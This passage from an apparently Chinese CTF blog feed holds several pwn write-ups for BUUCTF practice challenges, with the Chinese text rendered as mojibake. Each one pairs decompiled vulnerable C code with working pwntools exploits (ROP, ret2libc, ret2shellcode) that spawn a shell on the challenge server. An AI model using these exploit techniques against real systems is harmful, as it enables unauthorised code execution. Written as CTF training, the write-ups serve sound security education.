class="built_in">puts</span>(<span class="string">&quot;Pull up your sword and tell me u story!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">100uLL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-ÊºèÊ¥ûÂàÜÊûê">2.ÊºèÊ¥ûÂàÜÊûê</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>Âè™ÊúâNX‰øùÊä§,ÁÑ∂ÂêéÈÄÜÂêëÂèëÁé∞Ê≤°ÊúâÂà´ÁöÑ‰∏úË•øÂè™Êúâ‰∏Ä‰∏™Ê†àÊ∫¢Âá∫ÊºèÊ¥û,ËÄÉËôëret2libc3ÊâãÊ≥ï,‰πüÊ≤°ÊúâÂà´ÁöÑËä±Ê¥ª,Ê∂âÂèäÂà∞‰∏Ä‰∫õLibcSearcherÊõ¥Êñ∞ÁöÑ‰∏úË•ø,ÂÜôÂú®Á¨îËÆ∞Èáå‰∫Ü,ÊúÄÂêéÈôÑ‰∏äexp.</p><h2 id="3-exploit">3.exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26669</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x20</span>+<span class="number">0x8</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">start_got=elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">vul=<span class="number">0x40067D</span></span><br><span class="line">pop_ret=<span class="number">0x400733</span></span><br><span class="line">ret=<span class="number">0x4004c9</span> </span><br><span class="line">payload=cyclic(offset)+p64(pop_ret)+p64(start_got)+p64(puts_plt)+p64(vul)</span><br><span class="line"></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Pull up your sword and tell me u story!&#x27;</span>,payload)</span><br><span class="line">io.recvline()</span><br><span class="line">start_addr=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">info(<span class="string">&#x27;start:&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>((start_addr))))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,start_addr)</span><br><span class="line">base=start_addr-libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)s</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload=cyclic(offset)+p64(pop_ret)+p64(bin_sh)+p64(system)</span><br><span class="line"></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Pull up your sword and tell me u story!&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;&quot;&gt;&lt;/h2&gt;
&lt;hr&gt;
&lt;h2 id=&quot;ÊëòË¶Å&quot;&gt;ÊëòË¶Å&lt;/h2&gt;
&lt;p&gt;ÁªèÂÖ∏ÁöÑx64‰∏ãÁöÑret2libc3È¢òÁõÆ,ÊúÄËøëÂÅöÁÆÄÂçïÈ¢òÊúâÁÇπÈ∫ª‰∫Ü,‰∏çËøáËøòÊòØÊúâ‰∏Ä‰∫õÂ∑•ÂÖ∑‰ΩøÁî®ÁöÑÂ∞èÁªÜËäÇÂèØ‰ª•ÁßØÁ¥ØÁöÑ.&lt;/p&gt;
&lt;h2 id=&quot;1-ÈÄÜÂêë&quot;&gt;1.ÈÄÜÂêë&lt;/h2&gt;
&lt;figure class=&quot;</summary>
      
    
    
    
    <category term="È¢òËß£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>ÈìÅ‰∫∫‰∏âÈ°π(Á¨¨‰∫îËµõÂå∫)_2018_rop</title>
    <link href="https://www.fomal.cc/posts/e9e8a63.html"/>
    <id>https://www.fomal.cc/posts/e9e8a63.html</id>
    <published>2023-04-07T05:09:06.877Z</published>
    <updated>2023-04-09T06:22:56.737Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ÊëòË¶Å">ÊëòË¶Å</h2><p>x86ÁÆÄÂçïROPÈ¢ò,ÊãøÊù•Â§ç‰π†‰∏Ä‰∏ãÂ∑•ÂÖ∑</p><h2 id="1-ÈÄÜÂêë">1.ÈÄÜÂêë</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+10h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">256u</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  be_nice_to_people();</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">0xD</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-ÊºèÊ¥ûÂàÜÊûê">2.ÊºèÊ¥ûÂàÜÊûê</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">  RELRO:    Partial RELRO</span><br><span class="line">  Stack:    No canary found</span><br><span class="line">  NX:       NX enabled</span><br><span class="line">  PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>x86ÁöÑÁ®ãÂ∫èÂè™ÂºÄ‰∫ÜÈÉ®ÂàÜRELROÂíåNX‰øùÊä§,ÂèëÁé∞ÊúâÂæàÊòéÊòæÁöÑÊ†àÊ∫¢Âá∫ÊºèÊ¥û,IDAÈáåÊ≤°ÊúâÂèëÁé∞<code>system()</code>Âíå<code>bin/sh</code>,ËøôÈáå‰πüÊ≤°ÊúâÂ§ö‰ΩôÁöÑËä±Ê†∑.Áõ¥Êé•Ê≥ÑÈú≤‰∏Ä‰∏ãgotÁÑ∂ÂêéÊâæ‰∏Ä‰∏ãglibcÁâàÊú¨Â∏ÉÁΩÆ‰∏Ä‰∏ãROPÂ∞±ËÉΩÊãøÂà∞shell‰∫Ü,ÊúÄÂêéÈôÑ‰∏äexp.</p><h2 id="3-exploit">3.exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25522</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x88</span>+<span class="number">0x4</span></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=<span class="number">0x80484C6</span></span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>) <span class="comment">##Âè™Ë¶ÅÂèëÈÄÅÂõõ‰∏™Â∞±Â§ü‰∫Ü</span></span><br><span class="line"></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr=u32(io.recv(<span class="number">4</span>)) <span class="comment">##Êé•Êî∂‰πüÊòØÂõõ‰∏™</span></span><br><span class="line">info(<span class="string">&quot;write:&quot;</span>+(<span class="built_in">str</span>)(write_addr))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p32(system)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_sh)</span><br><span class="line"></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ÊëòË¶Å&quot;&gt;ÊëòË¶Å&lt;/h2&gt;
&lt;p&gt;x86ÁÆÄÂçïROPÈ¢ò,ÊãøÊù•Â§ç‰π†‰∏Ä‰∏ãÂ∑•ÂÖ∑&lt;/p&gt;
&lt;h2 id=&quot;1-ÈÄÜÂêë&quot;&gt;1.ÈÄÜÂêë&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span c</summary>
      
    
    
    
    <category term="È¢òËß£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>ciscn_2019_n_5 WP</title>
    <link href="https://www.fomal.cc/posts/d7f9e082.html"/>
    <id>https://www.fomal.cc/posts/d7f9e082.html</id>
    <published>2023-04-06T06:29:09.200Z</published>
    <updated>2023-04-09T06:23:31.041Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ÊëòË¶Å">ÊëòË¶Å</h2><p>ret2shellcodeÂÖ•Èó®È¢ò,ÂÄüÁùÄËøôÈ¢òÂ§ç‰π†‰∏Ä‰∏ãret2shellcodeÂêÑÁßçÂ∑•ÂÖ∑ÁöÑ‰ΩøÁî®ÁªÜËäÇ.</p><h2 id="1-ÈÄÜÂêë">1.ÈÄÜÂêë</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> text[<span class="number">30</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;tell me your name&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, name, <span class="number">0x64</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;wow~ nice name!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want to say to me?&quot;</span>);</span><br><span class="line">  gets(text);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-ÂàÜÊûê">2.ÂàÜÊûê</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>ÂèØ‰ª•ÁúãÂà∞Âè™ÂºÄÂêØ‰∫ÜNXÁâáÊÆµ,‰∏çËøáÂ≠òÂú®RWXÁâáÊÆµ,Áî®ROPgadgetÊü•‰∫Ü‰∏Ä‰∏ãÂèëÁé∞Ê≤°ÊúâÁé∞ÊàêÁöÑ‰º†ÂèÇÊåá‰ª§,ÈÇ£‰πàret2libcÂ∞±ÊúâÁÇπÈöæ‰∫Ü,ËøôÈáåÂõ†‰∏∫Êúâ‰∏™.bssÊÆµ‰∏äÂÖ®Â±ÄÂèòÈáè<code>name</code>,ËôΩÁÑ∂Êú¨Âú∞Áî®vammapÊü•Âá∫Êù•Ê≤°ÊúâRWXÊùÉÈôê,Êä±ÁùÄËØï‰∏ÄËØïÁöÑÂøÉÊÄÅËøòÊòØÂÜ≥ÂÆöÊääshellcodeËØªÂà∞<code>name</code>ÁÑ∂ÂêéretÂõûÂéª,ÁÑ∂ÂêéÂ∞±Êàê‰∫Ü.</p><h2 id="3-exploit">3.exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27133</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x20</span>+<span class="number">0x8</span></span><br><span class="line">name=<span class="number">0x601080</span></span><br><span class="line">read=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">ret=<span class="number">0x4004c9</span></span><br><span class="line"></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;tell me your name&#x27;</span>,shellcode)</span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p64(ret)+p64(name)</span><br><span class="line"></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;What do you want to say to me?&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="4-shellcraft‰ΩøÁî®Â∞èÁªì">4.shellcraft‰ΩøÁî®Â∞èÁªì</h2><p>shellcraftÈªòËÆ§Âá∫Êù•ÁöÑÊòØx86ËÄå‰∏çÊòØx64ÁöÑÊ±áÁºñ,ËøôÈáåÊúâ‰∏§ÁßçÊñπÊ≥ïÂèØ‰ª•Áî®shellcraftÂÜôÂá∫x64,‰∏ÄÁßçÂ∞±ÊòØ‰∏äÈù¢ÁöÑexpÈáåÂÖàÂ£∞Êòéarch,ÁÑ∂ÂêéÁõ¥Êé•<code>shellcraft.sh()</code>,ËøôÈáå‰πüÂèØ‰ª•Âä†‰∏≠Èó¥ÁöÑamd64ÂèÇÊï∞.</p><p>ËøòÊúâ‰∏ÄÁßçÊòØ<code>shellcraft.amd64.sh()</code>Áõ¥Êé•Êù•,‰∏çËøáËøôÈÅìÁ¨îËÄÖÊ≤°Â£∞ÊòéÊû∂ÊûÑÁõ¥Êé•ÁîüÊàêÂ∞±Â∫ü‰∫Ü,ÁõÆÂâçËøò‰∏çÊ∏ÖÊ•öÂéüÂõ†,Âç≥‰ΩøËøô‰∏§ÁßçÊñπÂºèÈÉΩÊòØ‰∏ÄÊ†∑ÁöÑ‰ª£Á†Å,‰∏çËøáÊ±áÁºñÂô®Â•ΩÂÉèÊúâÁÇπÈóÆÈ¢ò.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ÊëòË¶Å&quot;&gt;ÊëòË¶Å&lt;/h2&gt;
&lt;p&gt;ret2shellcodeÂÖ•Èó®È¢ò,ÂÄüÁùÄËøôÈ¢òÂ§ç‰π†‰∏Ä‰∏ãret2shellcodeÂêÑÁßçÂ∑•ÂÖ∑ÁöÑ‰ΩøÁî®ÁªÜËäÇ.&lt;/p&gt;
&lt;h2 id=&quot;1-ÈÄÜÂêë&quot;&gt;1.ÈÄÜÂêë&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;</summary>
      
    
    
    
    <category term="È¢òËß£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>not_the_same_3dsctf_2016</title>
    <link href="https://www.fomal.cc/posts/de339b6d.html"/>
    <id>https://www.fomal.cc/posts/de339b6d.html</id>
    <published>2023-04-05T15:56:38.055Z</published>
    <updated>2023-04-09T06:24:22.845Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ÊëòË¶Å">ÊëòË¶Å</h2><p>‰∏ÄÈÅìÂæàÁÆÄÂçïÁöÑret2libc1,‰ΩÜÊòØË¢´ÁªÜËäÇËñÑÁ∫±.</p><h2 id="1-ÈÄÜÂêë">1.ÈÄÜÂêë</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_secret</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// esi</span></span><br><span class="line"></span><br><span class="line">  v0 = fopen(<span class="string">&quot;flag.txt&quot;</span>, &amp;unk_80CF91B);</span><br><span class="line">  fgets(&amp;fl4g, <span class="number">45</span>, v0);</span><br><span class="line">  <span class="keyword">return</span> fclose(v0);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">45</span>]; <span class="comment">// [esp+Fh] [ebp-2Dh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;</span>);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-ÂàÜÊûê">2.ÂàÜÊûê</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>Á®ãÂ∫èÊòØÈùôÊÄÅÈìæÊé•,‰∏çËøá‰πüÊ≤°ÊúâÁªôÂá∫<code>system()</code>,ÁúãÂà∞Êúâ‰∏Ä‰∏™ÂêéÈó®ÂáΩÊï∞Áõ¥Êé•ÊääflagËØªËøõbssÊÆµÈáå,‰ΩÜÊòØÊ≤°ÊúâÁõ¥Êé•ËæìÂá∫,ËøôÈáåÂ∞±ÈúÄË¶ÅÊûÑÈÄ†ROPÈìæÊù•Ëß£ÂÜ≥,ËøôÈáåÂàöÂ•ΩÊúâ<code>write()</code>Â∞±Áõ¥Êé•Áî®‰∫Ü,ÂÜçÁúãÊ±áÁºñ:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">; int get_secret()</span><br><span class="line">public get_secret</span><br><span class="line">get_secret proc near</span><br><span class="line"></span><br><span class="line">var_1C= dword ptr -1Ch</span><br><span class="line">var_18= dword ptr -18h</span><br><span class="line">var_14= dword ptr -14h</span><br><span class="line"></span><br><span class="line">push    esi</span><br><span class="line">sub     esp, 18h</span><br><span class="line">mov     [esp+1Ch+var_18], offset unk_80CF91B</span><br><span class="line">mov     [esp+1Ch+var_1C], offset aFlagTxt ; &quot;flag.txt&quot;</span><br><span class="line">call    fopen</span><br><span class="line">mov     esi, eax</span><br><span class="line">mov     [esp+1Ch+var_14], esi</span><br><span class="line">mov     [esp+1Ch+var_18], 2Dh ; &#x27;-&#x27;</span><br><span class="line">mov     [esp+1Ch+var_1C], offset fl4g</span><br><span class="line">call    fgets</span><br><span class="line">mov     [esp+1Ch+var_1C], esi</span><br><span class="line">call    fclose</span><br><span class="line">add     esp, 18h</span><br><span class="line">pop     esi</span><br><span class="line">retn</span><br><span class="line">get_secret endp</span><br></pre></td></tr></table></figure><p>Ë∞ÉÁî®<code>main()</code>Êó∂Âπ∂Ê≤°ÊúâÂéãÂÖ•ebp,ÊâÄ‰ª•Áõ¥Êé•Áî®IDAÁªôÁöÑÂÅèÁßª‰∏çÁî®Âä†0x4,Áî±‰∫éÂáΩÊï∞Ê≤°ÊúâÂÖ≥ÁºìÂÜ≤Âå∫,ÊâÄ‰ª•Êàë‰ª¨Âú®‰ΩøÁî®<code>write()</code>ÊâìÂç∞flagÁöÑÊó∂ÂÄôËøòÈúÄË¶ÅËøΩÂä†‰∏Ä‰∏™<code>exit()</code>Êù•ÂÖ≥Èó≠Á®ãÂ∫èËÆ©ÁºìÂÜ≤Âå∫ÁöÑflagË¢´ÂêêÂá∫Êù•.</p><p>ÁÑ∂ÂêéÂ∞±ÊòØÊääÁ¨îËÄÖËñÑÁ∫±ÁöÑÂú∞ÂùÄÂâçÂØº0ÈóÆÈ¢ò‰∫Ü,‰πãÂâçÁî®ÁöÑÂ§ßÂ§öÊï∞ÈÉΩÊòØpwntoolsÁöÑÊñπÊ≥ïÊù•ÂèñÂú∞ÂùÄ,ËøôÊ¨°ÂøÉË°ÄÊù•ÊΩÆÁõ¥Êé•IDAÈáåÂ§çÂà∂Â∏¶‰∏ä‰∫ÜÂâçÂØºÁöÑ0,Ê≤°ÊúâÊâìÈÄöüò≠,ÂêéÊù•Áî®‰∫ÜpwntoolsÊâìÂç∞‰∫ÜÂú∞ÂùÄÂØπÊØîÊâçÂèëÁé∞ÈóÆÈ¢ò,ÊúÄÂêéÈôÑ‰∏äexp.</p><h2 id="3-exploit">3.exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25236</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x2d</span></span><br><span class="line">get_secret=<span class="number">0x80489A0</span></span><br><span class="line">write=<span class="number">0x806E270</span> <span class="comment">##ÁªÜËäÇ‰∏çÂä†ÂâçÂØº0Âê¶Âàô‰∏çÈÄö</span></span><br><span class="line">flag=<span class="number">0x80ECA2D</span></span><br><span class="line">exit=<span class="number">0x804E660</span></span><br><span class="line"><span class="comment">#pop3_ret=0x80483b8</span></span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p32(get_secret)+p32(write)+p32(exit)+p32(<span class="number">1</span>)+p32(flag)+p32(<span class="number">45</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="4-ÊÄªÁªì">4.ÊÄªÁªì</h2><p>Âú∞ÂùÄÂà´Âä†ÂâçÂØº0! üò≠</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ÊëòË¶Å&quot;&gt;ÊëòË¶Å&lt;/h2&gt;
&lt;p&gt;‰∏ÄÈÅìÂæàÁÆÄÂçïÁöÑret2libc1,‰ΩÜÊòØË¢´ÁªÜËäÇËñÑÁ∫±.&lt;/p&gt;
&lt;h2 id=&quot;1-ÈÄÜÂêë&quot;&gt;1.ÈÄÜÂêë&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;</summary>
      
    
    
    
    <category term="È¢òËß£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>ciscn_2019_en_2</title>
    <link href="https://www.fomal.cc/posts/1d3978ed.html"/>
    <id>https://www.fomal.cc/posts/1d3978ed.html</id>
